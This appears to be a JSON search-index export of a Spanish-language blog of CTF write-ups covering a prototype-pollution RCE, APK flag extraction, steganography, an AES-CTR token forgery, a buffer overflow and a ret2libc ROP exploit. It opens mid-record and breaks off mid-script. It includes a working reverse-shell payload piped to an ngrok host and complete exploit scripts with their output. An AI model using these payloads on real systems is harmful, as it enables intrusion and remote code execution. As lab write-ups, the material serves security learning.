\"line\": \"process.mainModule.require(\\\"child_process\\\").execSync(\\\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 0.tcp.ngrok.io 14109 \u0026gt;/tmp/f\\\")\" } }  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from ::1. Ncat: Connection from ::1:59469. /bin/sh: can't access tty; job control turned off /app $ whoami nobody /app $ ls flagYFOSp index.js node_modules package.json routes static views yarn.lock /app $ cat flagYFOSp HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}  ","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/web/gunship/","section":"ctf","summary":"Prototype Pollution. AST Injection","time":3,"title":"Gunship"},{"contents":"Tenemos un archivo APK de Android llamado thermostat.apk:\n$ file thermostat.apk thermostat.apk: Zip archive data, at least v0.0 to extract, compression method=deflate  Como se muestram un archivo APK es solo un archivo ZIP. Por tanto, podemos extraer su contenido:\n$ 7z x thermostat.apk Scanning the drive for archives: 1 file, 2595443 bytes (2535 KiB) Extracting archive: thermostat.apk -- Path = thermostat.apk Type = zip Physical Size = 2595443 Everything is Ok Files: 569 Size: 4968479 Compressed: 2595443 $ ls AndroidManifest.xml META-INF classes.dex res resources.arsc thermostat.apk  Este reto es tan fácil que las flags se encuentran dentro de los archivos extraídos. Podemos utilizar grep de manera recursiva, no hay necesidad de utilizar apktool o descompiladores a código Java:\n$ grep -r FLAG * Binary file classes.dex matches  Vemos que hay coincidencias en classes.dex. Como se trata de un archivo binario, podemos ver la información imprimible mediante strings. Después, podemos extraer ambas flags utilizando grep de nuevo, pero con un filtro más específico (usando el formato de las flags de Hacker101CTF):\n$ strings classes.dex | grep -oE '\\^FLAG\\^.*?\\$FLAG\\$' ^FLAG^xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$FLAG$ ^FLAG^xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$FLAG$  ","image":"/images/mobile.png","permalink":"https://7rocky.github.io/ctf/hacker101ctf/h1-thermostat/","section":"ctf","summary":"Pentesting básico en archivos APK","time":0,"title":"H1 Thermostat"},{"contents":"Se nos proporciona una imagen JPEG llamada hackerman.jpg:\n$ file hackerman.jpg hackerman.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 960x540, components 3  Como es una imagen JPEG, podemos pensar en esteganografía usando steghide. Pero no parece que funcione de momento.\nSi miramos los caracteres imprimibles de la imagen, veremos una cadena de texto que parece un hash MD5 (32 dígitos hexadecimales):\n$ strings -20 hackerman.jpg | xxd 00000000: 0c0c 0c0c 0c0c 0c0c 0c0c 0c0c 0c0c 0c0c ................ 00000010: 0c0c 0c0c 0c0c 0c0c 0c0c 0c0c 0a0c 0c0c ................ 00000020: 0c0c 0c0c 0c0c 0c0c 0c0c 0c0c 0c0c 0c0c ................ 00000030: 0c0c 0c0c 0c0c 0c0c 0c0a 2526 2728 292a ..........%\u0026'()* 00000040: 3435 3637 3839 3a43 4445 4647 4849 4a53 456789:CDEFGHIJS 00000050: 5455 5657 5859 5a63 6465 6667 6869 6a73 TUVWXYZcdefghijs 00000060: 7475 7677 7879 7a0a 2627 2829 2a35 3637 tuvwxyz.\u0026'()*567 00000070: 3839 3a43 4445 4647 4849 4a53 5455 5657 89:CDEFGHIJSTUVW 00000080: 5859 5a63 6465 6667 6869 6a73 7475 7677 XYZcdefghijstuvw 00000090: 7879 7a0a 3536 3334 3237 3564 3639 3466 xyz.5634275d694f 000000a0: 3836 3635 3935 3737 3436 6339 3631 3931 8665957746c96191 000000b0: 3332 6630 0a 32f0. $ strings -20 hackerman.jpg | grep -v \\\\x0c %\u0026'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz \u0026'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz 5634275d694f8665957746c9619132f0 $ echo -n 5634275d694f8665957746c9619132f0 | wc -c 32  Si ponemos este hash en crackstation.net, veremos que almost es una palabra cuyo hash MD5 es el que aparece arriba.\nEntonces podemos probar almost como contraseña de steghide:\nY obtenemos una cadena de texto que parece codificada en Base64. Y aquí está la flag:\n$ echo SFRCezN2MWxfYzBycH0= | base64 -d HTB{3v1l_c0rp}  ","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/misc/hackerman/","section":"ctf","summary":"Hash MD5. Esteganografía con steghide","time":1,"title":"Hackerman"},{"contents":"Se nos proporciona un código fuente que nos pide iniciar sesión y nos ofrece algunas funcionalidades. Esta es la función principal:\ndefchallenge(req): fnames=initializeDatabase() file_record['admin'] =[fnameforfnameinfnames] req.sendall(b'Super secret file server for malicious operations.\\n'+ b'Who are you:\\n'+b'\u0026gt; ') user=req.recv(4096).decode().strip() ifuser=='admin': req.sendall( b'Administrator can access the server only via ssh.\\nGoodbye!\\n') return token=json.dumps({'username': user, 'timestamp': str(time.time())}) file_record[user] =[] key=os.urandom(16) iv, token_ct=encrypt(key, token.encode()) req.sendall(b'Your token is: '+token_ct.encode() +b'\\n') whileTrue: req.sendall( b'1. Upload a file.\\n2. Available files.\\n3. Download a file.\\n') req.sendall(b'\u0026gt; ') option=req.recv(4096).decode().strip() try: ifoption=='1': req.sendall(b'Submit your token, passphrase, and file.\\n') res=json.loads(req.recv(4096).decode().strip()) token_ct=bytes.fromhex(res['token']) token=json.loads(decrypt(key, iv, token_ct)) iftoken['username'] notinfile_record.keys(): file_record[token['username']] =[] dt=bytes.fromhex(res['data']) passphrase=res['passphrase'] fname=uploadFile(dt, passphrase) file_record[token['username']].append(fname) payload=json.dumps({'success': True}) req.sendall(payload.encode() +b'\\n') elifoption=='2': req.sendall(b'Submit your token.\\n') res=json.loads(req.recv(4096).decode().strip()) token_ct=bytes.fromhex(res['token']) token=json.loads(decrypt(key, iv, token_ct)) iftoken['username'] notinfile_record.keys(): payload=json.dumps({'files': []}) else: files=file_record[token['username']] payload=json.dumps({'files': files}) req.sendall(payload.encode() +b'\\n') elifoption=='3': req.sendall(b'Submit your token and passphrase.\\n') res=json.loads(req.recv(4096).decode().strip()) token_ct=bytes.fromhex(res['token']) token=json.loads(decrypt(key, iv, token_ct)) passphrase=res['passphrase'] fname=getFname(passphrase) files=file_record[token['username']] iffnamenotinfiles: payload=json.dumps({'filename': fname, 'success': False}) else: content=readFile(fname).hex() payload=json.dumps({ 'filename': fname, 'success': True, 'content': content }) req.sendall(payload.encode() +b'\\n') else: req.sendall(b'Wrong option.') exceptExceptionase: req.sendall(b'An error has occured. Please try again.\\n'+str(e).encode())  Lo primero de todo, hay un usuario llamado admin que tiene algunos archivos:\ndefinitializeDatabase(): fnames=[] directory=\"./uploads/\" forfileinos.listdir(directory): file=directory+file withopen(file, \"rb\") asf: data=f.read() fname=uploadFile(data, os.urandom(100)) os.rename(file, directory+fname) fnames.append(fname) returnfnames  Y no podemos iniciar sesión como admin directamente. Después de autenticarnos, se nos dará un token JSON cifrado (campos username y timestamp):\n$ nc 178.128.169.13 31214 Super secret file server for malicious operations. Who are you: \u0026gt; rocky Your token is: 5aaf6404b1d989c8c4cbb7fe535b6f3de7c6233d5b9560b7ff81ef42806a5c7ed46b12c8bd76b65961a35e75731aef95f0418b1c969e6deaa9145722c9e5fde1 1. Upload a file. 2. Available files. 3. Download a file. \u0026gt;  El cifrado para este token se hace en AES CTR. Aquí tenemos la primera vulnerabilidad. Así es como funciona AES CTR:\nVemos que el texto claro usa XOR contra el chorro de bits generado por los bloques AES con una clave dada, un IV y un contador. Entonces, el bit-stream es solo aplicar XOR entre el texto cifrado y el texto claro:\n$$ \\mathrm{ct} = \\mathrm{bs} \\oplus \\mathrm{pt} \\iff \\mathrm{bs} = \\mathrm{ct} \\oplus \\mathrm{pt} $$\nPor tanto, podemos modificar fácilmente el texto ciffrado de manera que se descifre como admin en el usuario:\n$$ \\mathrm{ct}\u0026rsquo; = \\mathrm{bs} \\oplus \\mathrm{pt}' $$\nPodemos verificar que no tenemos ningún archivo aún:\n$ nc 178.128.169.13 31214 ... 1. Upload a file. 2. Available files. 3. Download a file. \u0026gt; 2 Submit your token. {\"token\":\"5aaf6404b1d989c8c4cbb7fe535b6f3de7c6233d5b9560b7ff81ef42806a5c7ed46b12c8bd76b65961a35e75731aef95f0418b1c969e6deaa9145722c9e5fde1\"} {\"files\": []}  Ahora, vamos a comenzar el script usando pwntools para realizar las operaciones con XOR. Nótese que sabemos el texto claro original (token JSON) a excepción de timestamp. Podemos calcularlo justo antes de recibir el token (en verdad no es relevante ya que no se verifica).\ndefmain(): host, port=sys.argv[1].split(':') io=remote(host, int(port)) user='rocky' io.sendlineafter(b'\u0026gt; ', user.encode()) now=str(time.time()) io.recvuntil(b'Your token is: ') token_pt=json.dumps({'username': user, 'timestamp': now}) token_ct=bytes.fromhex(io.recvline().strip().decode()) stream=xor(pad(token_pt.encode(), 16), token_ct) admin_token_pt=json.dumps({'username': 'admin', 'timestamp': now}) admin_token_ct=xor(stream, pad(admin_token_pt.encode(), 16)) io.sendlineafter(b'\u0026gt; ', b'2') io.sendlineafter(b'Submit your token.\\n', json.dumps({'token': admin_token_ct.hex()}).encode()) files=set(json.loads(io.recv().decode())['files']) log.info(f'Files: {files}') io.interactive()  Y así nos conseguimos autenticar como admin. Tenemos estos archivos:\n$ python3 solve.py 178.128.169.13:31214 [+] Opening connection to 178.128.169.13 on port 31214: Done [*] Files: {'960330fe5ba25b', '50c6e8cef3a6f91e', '631bf546a8812a78', 'ff299d2e8e3a7783a7', 'ff6338870dcfeca5de'} [*] Switching to interactive mode 1. Upload a file. 2. Available files. 3. Download a file. \u0026gt; $  Estas son algunas funciones relacionadas con la gestión de archivos:\ndefgetFname(passphrase): tphrase=tuple(passphrase) returnhex(hash(tphrase)).replace('0x', '').replace('-', 'ff') defuploadFile(dt, passphrase): fname=getFname(passphrase) open('./uploads/'+fname, 'wb').write(dt) returnfname defreadFile(fname): returnopen('./uploads/'+fname, 'rb').read()  Nos gustaría usar la opción 3 para descargar todos los archivos y encontrar la flag en alguno de ellos. El problema aquí es que necesitamos introducir una passphrase que se transformará a tuple y luego se le aplicará la función de hash de Python (en getFname).\nEsta función hash devuelve un número de 8 bytes, pero depende mucho de los tipos de entrada:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; hex(hash('asdf')) '0x62c09052785dadc' \u0026gt;\u0026gt;\u0026gt; hex(hash(b'asdf')) '0x62c09052785dadc' \u0026gt;\u0026gt;\u0026gt; hex(hash(tuple('asdf'))) '0x49f23da86a2b619e' \u0026gt;\u0026gt;\u0026gt; hex(hash(tuple(b'asdf'))) '-0x49b8b3f6e75ed0ae' \u0026gt;\u0026gt;\u0026gt; hex(hash(1)) '0x1' \u0026gt;\u0026gt;\u0026gt; hex(hash(2)) '0x2' \u0026gt;\u0026gt;\u0026gt; hex(hash(tuple({'asdf': 1}))) '-0x13159d01c2f43a76'  Para números enteros, es trivial de invertir. De hecho, existe una manera de invertir la función hash para objetos de tipo tuple (que es nuestro caso). Encontré la solución en FCSC 2022 - Hash-ish. Este artículo analiza el código de Python en el que se implementa la función hash para tipo tuple.\nFinalmente, adapté las funciones escritas por el autor del artículo a nuestro problema. Como estamos tratando con documentos en JSON, podemos introducir una lista y se formateará como list en Python, y luego se transformará a tuple. Entonces todo bien:\nforfileinfiles: fname=find_collision(file) io.sendlineafter(b'\u0026gt; ', b'3') io.sendlineafter(b'Submit your token and passphrase.\\n', json.dumps({'token': admin_token_ct.hex(), 'passphrase': fname}).encode()) content=bytes.fromhex(json.loads(io.recvline().decode())['content']) ifb'HTB{'incontent: log.success(f'Flag: {content.decode().strip()}') break io.close()  Usando este script: solve.py podemos obtener la flag:\n$ python3 solve.py 178.128.169.13:31214 [+] Opening connection to 178.128.169.13 on port 31214: Done [*] Files: {'ff703746f45528d417', 'ff623150c55cdd9c09', '285f19e8770e0b14', 'ff637b5a6962fc4c3e', '57c39a9fbebb176a'} [+] Flag: HTB{f1nd1n9_2320_d4y5_1n_py7h0n_15_fun} [*] Closed connection to 178.128.169.13 port 31214  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/crypto/hash-the-filesystem/","section":"ctf","summary":"AES CTR. Función inversa de la función hash de Python","time":3,"title":"Hash the Filesystem"},{"contents":"Se nos proporciona un binario de 64 bits llamado vulnerable:\nArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments  Si ejecutamos el binario, parece que no hace nada:\n$ ./vulnerable asdf fdsa 1 2  Si insertamos datos desde la entrada estándar (stdin), vemos que el programa funciona:\n$ echo asdf | ./vulnerable Hello asdf !  Vamos a enviar 100 caracteres utilizando Python para ver si falla:\n$ ./vulnerable $(python3 -c 'print(\"A\" * 100)') Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ! zsh: segmentation fault (core dumped)  Perfecto, parece que el binario es vulnerable a Buffer Overflow.\nUtilizando una herramienta de ingeniería inversa (reversing) como Ghidra, se puede descompilar el binario y obtener código en C legible. La función main es la siguiente:\nint main(void) { char local_28[32]; memset(local_28, 0, 0x20); read_all_stdin(local_28); if (local_28[0] == '\\0') { puts(\"What is your name?\"); } else { printf(\"Hello %s!\\n\", local_28); } return 0; }  Está llamando a read_all_stdin:\nvoid read_all_stdin(long param_1) { int iVar1; int local_c; local_c = 0; while (true) { iVar1 = fgetc(stdin); if (iVar1 == -1) break; *(char *) (param_1 + local_c) = (char) iVar1; local_c = local_c + 1; } return; }  La vulnerabilidad está en que la variable llamada local_28 en la función main tiene 32 bytes asignados de buffer. Sin embargo, la función read_all_stdin está leyendo bytes hasta que los datos que hayamos introducido terminen (no hay limitación) y los añade a local_c (que es local_28 del main, aunque Ghidra no puede descompilarlo completamente).\nAunque no se llama en la función main, en el binario existe una función llamada print_flags:\nvoid print_flags(void) { char *__s; __s = getenv(\"FLAGS\"); puts(__s); /* WARNING: Subroutine does not return */ exit(0); }  Esta función evidentemente muestra la flag para completar el reto. Por tanto, el objetivo del exploit será ejecutar esta función.\nUna vulnerabilidad de Buffer Overflow consiste en introducir suficientes datos para exceder del buffer asignado a una determinada variable (en este caso, local_28). Después del buffer asignado a la variable, se encuentran un valor crítico para la ejecución del programa, que es la dirección de retorno (la cual se copia al registro $rip al retornar de una función). El desbordamiento del buffer otorga control potencial sobre este registro.\nEsta vez nos centraremos en controlar $rip, que es el registro Instruction Pointer. Como su propio nombre indica, contiene la dirección de la siguiente instrucción a ejecutar. Por consiguiente, si sobrescribimos $rip con la dirección de print_flags, esta función se ejecutará.\nLa dirección de la función se puede ver en Ghidra (0x4006ee). Aunque también se puede obtener mediante readelf:\n$ readelf -s vulnerable | grep print_flags 59: 00000000004006ee 34 FUNC GLOBAL DEFAULT 13 print_flags  Ahora necesitamos saber cuántos caracteres hay que introducir hasta controlar al registro $rip, y poder poner la dirección de print_flags. Esto se puede realizar mediante GDB y un patrón creado con cyclic de pwntools (por ejemplo, de 100 caracteres):\n$ pwn cyclic 100 | tee pattern aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa $ gdb -q vulnerable Reading symbols from vulnerable... (No debugging symbols found in vulnerable) gef➤ run 0x0000000000400771 in main ()  Ahora que el programa ha fallado, podemos examinar los valores de los registros. Como se trata de un binario de 64 bits, $rip no se sobrescribe (se podría decir que está protegido), por lo que tenemos que tomar el valor de $rsp (que es donde estaría guardada la dirección de retorno que se copiará en $rip):\ngef➤ x $rsp 0x7fffffffe758: 0x6161616b  El valor 0x6161616b se corresponde con kaaa (en formato little-endian). Podemos calcular el offset de nuevo con pwntools:\n$ pwn cyclic -l 0x6161616b 40  Por tanto, necesitamos introducir 40 caracteres y después la dirección de print_flags para redirigir la ejecución del programa. Vamos a hacerlo desde la línea de comandos. Para evitar comportamientos inesperados, vamos a poner una variable de entorno llamada FLAGS (ya que el binario la comprueba durante la función print_flags):\n$ export FLAGS=this_will_be_the_flag $ (python3 -c 'import sys; sys.stdout.write(\"A\" * 40)'; echo -e '\\xee\\x06\\x40\\0\\0\\0\\0\\0') | ./vulnerable Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@! this_will_be_the_flag  Perfecto, ahora tenemos que enviar lo mismo a la instancia remota. Como los datos se toman desde un parámetro de URL, necesitamos codificar los caracteres hexadecimales a codificación URL:\n$ curl \"http://35.227.24.107/0f7bd59245/?stdin=$(python3 -c 'import sys; sys.stdout.write(\"A\" * 40)')%ee%06%40%00%00%00%00%00\" \u0026lt;a href=\"vulnerable\"\u0026gt;Download binary\u0026lt;/a\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;form\u0026gt;Stdin: \u0026lt;input type=\"text\" name=\"stdin\"\u0026gt; \u0026lt;input type=\"submit\"\u0026gt;\u0026lt;/form\u0026gt; \u0026lt;pre\u0026gt;Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@! [\"^FLAG^xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$FLAG$\"] \u0026lt;/pre\u0026gt;  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/hacker101ctf/hello-world/","section":"ctf","summary":"Binario de 64 bits. Buffer Overflow. Control del flujo de ejecución del programa","time":3,"title":"Hello World!"},{"contents":"Se nos proporciona un binario de 64 bits llamado vuln y un archivo libc.so.6 como librería externa:\nArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./'  Si ejecutamos el binario obtendremos una violación de segmento (segmentation fault):\n$ chmod +x vuln $ ./vuln zsh: segmentation fault (core dumped) ./vuln  Está configurado para utilizar Glibc desde el directorio actual:\n$ ldd vuln linux-vdso.so.1 (0x00007ffdc3195000) libc.so.6 = ./libc.so.6 (0x00007ff93c204000) /lib64/ld-linux-x86-64.so.2 (0x00007ff93c5f7000)  Usaremos pwninit para parchear el binario y hacer que funcione:\n$ pwninit --libc libc.so.6 --no-template --bin vuln bin: vuln libc: libc.so.6 fetching linker https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.27-3ubuntu1.2_amd64.deb unstripping libc https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.27-3ubuntu1.2_amd64.deb setting ./ld-2.27.so executable copying vuln to vuln_patched running patchelf on vuln_patched  Y ahora funciona:\n$ ./vuln_patched WeLcOmE To mY EcHo sErVeR! asdf AsDf  El programa está tomando la entrada de usuario y transformando las letras a mayúsculas y minúsculas alternativamente. Vamos a ver si es vulnerable a Buffer Overflow:\n$ python3 -c 'print(\"A\" * 300)' | ./vuln_patched WeLcOmE To mY EcHo sErVeR! AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAAAAAAAAAAAAAAAAAAAAd zsh: done python3 -c 'print(\"A\" * 300)' | zsh: segmentation fault (core dumped) ./vuln_patched  Y es vulnerable ya que el programa se rompe, que significa que la dirección de retorno se ha modificado. Podemos utilizar GDB para obtener el número exacto de caracteres necesarios para modificar la dirección de retorno:\n$ gdb -q vuln_patched Reading symbols from vuln_patched... (No debugging symbols found in vuln_patched) gef➤ pattern create 300 [+] Generating a pattern of 300 bytes (n=8) aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaa aauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa [+] Saved as '$_gef0' gef➤ run Starting program: ./vuln_patched WeLcOmE To mY EcHo sErVeR! aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaa aauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa AaAaAaAaBaAaAaAaCaAaAaAaDaAaAaAaEaAaAaAaFaAaAaAaGaAaAaAaHaAaAaAaIaAaAaAaJaAaAaAaKaAaAaAaLaAaAaAaMaAaaaaanaaaaaaaoaaaaaaad Program received signal SIGSEGV, Segmentation fault. 0x0000000000400770 in do_stuff ()  gef➤ pattern offset $rsp [+] Searching for '$rsp' [+] Found at offset 136 (little-endian search) likely [+] Found at offset 129 (big-endian search)  Vemos que necesitamos 136 caracteres antes de modificar el registro $rsp (donde se almacena la dirección de retorno antes de llamar a una función).\nComo el binario tiene la protección NX, necesitamos utilizar Return Oriented Programming (ROP) para explotar la vulnerabilidad. Además, tendremos que burlar el ASLR porque probablemente estará habilitado en la instancia remota.\nPara poder burlar el ASLR, necesitamos fugar una dirección de Glibc en tiempo de ejecución, de manera que podamos calcular la dirección base de la librería y obtener la dirección real de system y \u0026quot;/bin/sh\u0026quot; (esta técnica se conoce como Ret2Libc).\nComo tenemos un Buffer Overflow, tenemos control de la siguiente dirección que se va a ejecutar. Por tanto, podemos llamar a una función como puts para mostrar la dirección de otra función. Para llamar a puts tenemos que usar la dirección de puts en la Tabla de Enlaces a Procedimientos (Procedure Linkage Table, PLT). Esta función muestra el primer argumento como una cadena de caracteres (por lo que imprime el contenido de una dirección dada hasta encontrar un carácter nulo). Por tanto, el argumento para puts será la dirección de una función en la Tabla de Offsets Globales (Global Offset Table, GOT), que contiene la dirección real de una función si esta ya ha sido resuelta.\nDebido a la convención de llamadas a funciones en 64 bits, tenemos que poner el primer parámetro en el registro $rdi antes de llamar a la función.\nPara ello, usaremos gadgets. Estos son secuencias de instrucciones en ensamblador que terminan en ret, por lo que al ejecutarse, vuelven a la pila (stack), donde estará el siguiente gadget o la siguiente llamada a función. De ahí el nombre de la técnica ROP, estamos ejecutando código de direcciones específicas del binario y volviendo al siguiente. La secuencia de gadgets empleada durante la explotación se conoce comúnmente como ROP chain y nos permite burlar la protección NX.\nVamos a encontrar toda la información que necesitamos para la explotación:\n$ objdump -d vuln | grep puts 0000000000400540 \u0026lt;puts@plt\u0026gt;: 400540: ff 25 d2 0a 20 00 jmpq *0x200ad2(%rip) # 601018 \u0026lt;puts@GLIBC_2.2.5\u0026gt; 400769: e8 d2 fd ff ff callq 400540 \u0026lt;puts@plt\u0026gt; 400891: e8 aa fc ff ff callq 400540 \u0026lt;puts@plt\u0026gt;  Aquí tenemos puts en la PLT (0x400540) y puts en la GOT (0x601018). La dirección de puts en la GOT también se puede obtener con readelf y con otro parámetro de objdump:\n$ objdump -R vuln | grep puts 0000000000601018 R_X86_64_JUMP_SLOT puts@GLIBC_2.2.5 $ readelf -r vuln | grep puts 000000601018 000100000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0  Ahora tenemos que encontrar un gadget que ponga la dirección de puts en la GOT en el registro $rdi. Un gadget útil puede ser pop rdi; ret, el cual toma un valor de la pila y lo pone en $rdi. Vamos a buscarlo con ROPgadget:\n$ ROPgadget --binary vuln | grep 'pop rdi ; ret' 0x0000000000400913 : pop rdi ; ret  Un último dato que necesitamos es la dirección del main. Esto es necesario para indicar la última función que se va a llamar en la ROP chain, de manera que podemos reiniciar el programa sin cerrar el proceso:\n$ readelf -s vuln | grep main$ 63: 0000000000400771 305 FUNC GLOBAL DEFAULT 13 main  Podemos escribir este script en Python para explotar el binario:\n#!/usr/bin/env python3 from pwn import * context.binary = elf = ELF('vuln_patched') glibc = ELF('libc.so.6', checksec=False) def get_process(): if len(sys.argv) == 1: return elf.process() host, port = sys.argv[1], int(sys.argv[2]) return remote(host, port) def main(): p = get_process() offset = 136 junk = b'A' * offset pop_rdi_ret = 0x400913 puts_got = 0x601018 puts_plt = 0x400540 main_addr = 0x400771 payload = junk payload += p64(pop_rdi_ret) payload += p64(puts_got) payload += p64(puts_plt) payload += p64(main_addr) p.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!\\n', payload) p.recvline() p.interactive() if __name__ == '__main__': main()  Si lo ejecutamos, vemos que fugamos la dirección de puts en tiempo de ejecución y el main se vuelve a ejecutar:\n$ python3 solve.py [*] './vuln_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'.' [+] Starting local process './vuln_patched': pid 143772 [*] Switching to interactive mode 0\\x1a\\x90\\xa6\\x7f WeLcOmE To mY EcHo sErVeR! $  Para poder calcular la dirección base de Glibc en tiempo de ejecución, tenemos que restar el offset de puts en Glibc a su dirección en tiempo de ejecución. El offset de puts es 0x80a30:\n$ readelf -s libc.so.6 | grep ' puts$' 7481: 0000000000080a30 512 FUNC WEAK DEFAULT 13 puts  Podemos actualizar el exploit para que muestre este resultado:\nputs_addr = u64(p.recvline().strip().ljust(8, b'\\0')) log.info(f'Leaked puts() address: {hex(puts_addr)}') puts_offset = 0x80a30 glibc_base_addr = puts_addr - puts_offset log.info(f'Glibc base address: {hex(glibc_base_addr)}')  Y ahora podemos verlo al ejecutar el exploit:\n$ python3 solve.py [*] './vuln_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'.' [+] Starting local process './vuln_patched': pid 148874 [*] Leaked puts() address: 0x7fa62ed48a30 [*] Glibc base address: 0x7fa62ecc8000 [*] Switching to interactive mode WeLcOmE To mY EcHo sErVeR! $  Esto es útil porque si la dirección base de Glibc no termina en 000 en hexadecimal, es probable que algo no está yendo bien. El proceso de aleatorización de ASLR genera números que terminan en 000, por lo que es una prueba de que todo va bien durante la explotación.\nAhora es el momento de llamar a system con \u0026quot;/bin/sh\u0026quot; como argumento (de nuevo, tenemos que usar el gadget pop rdi; ret para poner el puntero a \u0026quot;/bin/sh\u0026quot; como argumento de system).\nLa información necesaria está aquí:\n$ readelf -s libc.so.6 | grep ' system$' 6032: 000000000004f4e0 45 FUNC WEAK DEFAULT 13 system $ strings -atx libc.so.6 | grep /bin/sh 1b40fa /bin/sh  Y ahora seguimos con una segunda ROP chain para conseguir una shell:\nsystem_offset = 0x4f4e0 bin_sh_offset = 0x1b40fa system_addr = glibc_base_addr + system_offset bin_sh_addr = glibc_base_addr + bin_sh_offset payload = junk payload += p64(pop_rdi_ret) payload += p64(bin_sh_addr) payload += p64(system_addr) p.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!\\n', payload) p.recvline() p.interactive()  Pero si lo ejecutamos, no conseguimos una shell\u0026hellip;\n$ python3 solve.py [*] './vuln_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'.' [+] Starting local process './vuln_patched': pid 157202 [*] Leaked puts() address: 0x7f394d102a30 [*] Glibc base address: 0x7f394d082000 [*] Switching to interactive mode [*] Got EOF while reading in interactive $  Esto ocurre debido al alineamiento de la pila (stack alignment). En el momento de llamar a system, la pila no está alineada y el programa termina. La solución a esto es poner un simple gadget ret antes de llamar a system.\nComo ya tenemos pop rdi; ret en 0x400913, sabemos que ret estará en 0x400914 (una unidad más). También podríamos buscarlo con ROPgadget.\npayload = junk payload += p64(pop_rdi_ret) payload += p64(bin_sh_addr) payload += p64(pop_rdi_ret + 1) payload += p64(system_addr) p.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!\\n', payload) p.recvline() p.interactive()  Y ahora sí tenemos una shell en local:\n$ python3 solve.py [*] './vuln_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'.' [+] Starting local process './vuln_patched': pid 174597 [*] Leaked puts() address: 0x7f191fcada30 [*] Glibc base address: 0x7f191fc2d000 [*] Switching to interactive mode $ ls ld-2.27.so libc.so.6 Makefile solve.py vuln vuln_patched  Vamos a lanzarlo contra la instancia remota y a leer la flag:\n$ python3 solve.py mercury.picoctf.net 24159 [*] './vuln_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'.' [+] Opening connection to mercury.picoctf.net on port 24159: Done [*] Leaked puts() address: 0x7f9f791eaa30 [*] Glibc base address: 0x7f9f7916a000 [*] Switching to interactive mode $ ls flag.txt libc.so.6 vuln vuln.c xinet_startup.sh $ cat flag.txt picoCTF{1_\u0026lt;3_sm4sh_st4cking_cf205091ad15ab6d}  Adicionalmente, se puede escribir el exploit utilizando más funcionalidades de pwntools:\n#!/usr/bin/env python3 from pwn import context, ELF, log, p64, remote, ROP, sys, u64 context.binary = elf = ELF('vuln_patched') glibc = ELF('libc.so.6', checksec=False) rop = ROP(elf) def get_process(): if len(sys.argv) == 1: return elf.process() host, port = 